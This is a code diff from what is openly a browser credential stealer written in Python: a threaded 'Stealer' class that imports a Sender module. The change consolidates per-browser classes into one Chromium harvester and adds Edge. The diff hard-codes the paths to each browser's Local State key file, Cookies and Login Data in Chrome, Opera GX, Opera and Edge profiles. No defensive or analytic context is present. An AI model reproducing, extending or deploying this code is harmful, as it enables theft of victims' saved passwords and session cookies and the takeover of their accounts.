@@ -1,14 +1,12 @@
 from shutil import rmtree
-from os import path, mkdir
 from getpass import getuser
 from threading import Thread
+from os import path, mkdir, environ, sep
 
 from .modules.sender import Sender
 from .modules.system import System
 
-from .browsers.chrome import Chrome
-from .browsers.opera_gx import Opera_GX
-from .browsers.opera_default import Opera_Default
+from .browsers.chromium import Chromium
 
 
 class Stealer(Thread):
@@ -27,26 +25,46 @@ class Stealer(Thread):
 
         self.browsers = [
             {
-                "method": Chrome(
+                "method": Chromium(
+                    "Chrome",
                     self.storage_path,
                     self.storage_folder,
-                    "/Chrome",
+                    rf"{environ['USERPROFILE']}{sep}AppData\Local\Google\Chrome\User Data\Local State",
+                    rf"{environ['USERPROFILE']}{sep}AppData\Local\Google\Chrome\User Data\default\Cookies",
+                    rf"{environ['USERPROFILE']}{sep}AppData\Local\Google\Chrome\User Data\default\Login Data",
                     self.errors
                 )
             },
             {
-                "method": Opera_GX(
+                "method": Chromium(
+                    "Opera GX",
                     self.storage_path,
                     self.storage_folder,
-                    "/Opera GX",
+                    rf"{environ['USERPROFILE']}{sep}AppData\Roaming\Opera Software\Opera GX Stable\Local State",
+                    rf"{environ['USERPROFILE']}{sep}AppData\Roaming\Opera Software\Opera GX Stable\Cookies",
+                    rf"{environ['USERPROFILE']}{sep}AppData\Roaming\Opera Software\Opera GX Stable\Login Data",
                     self.errors
                 )
             },
             {
-                "method": Opera_Default(
+                "method": Chromium(
+                    "Opera Default",
                     self.storage_path,
                     self.storage_folder,
-                    "/Opera Default",
+                    rf"{environ['USERPROFILE']}{sep}AppData\Roaming\Opera Software\Opera Stable\Local State",
+                    rf"{environ['USERPROFILE']}{sep}AppData\Roaming\Opera Software\Opera Stable\Cookies",
+                    rf"{environ['USERPROFILE']}{sep}AppData\Roaming\Opera Software\Opera Stable\Login Data",
+                    self.errors
+                )
+            },
+            {
+                "method": Chromium(
+                    "Microsoft Edge",
+                    self.storage_path,
+                    self.storage_folder,
+                    rf"{environ['USERPROFILE']}{sep}AppData\Local\Microsoft\Edge\User Data\Local State",
+                    rf"{environ['USERPROFILE']}{sep}AppData\Local\Microsoft\Edge\User Data\Default\Cookies",
+                    rf"{environ['USERPROFILE']}{sep}AppData\Local\Microsoft\Edge\User Data\Default\Login Data",
                     self.errors
                 )
             }
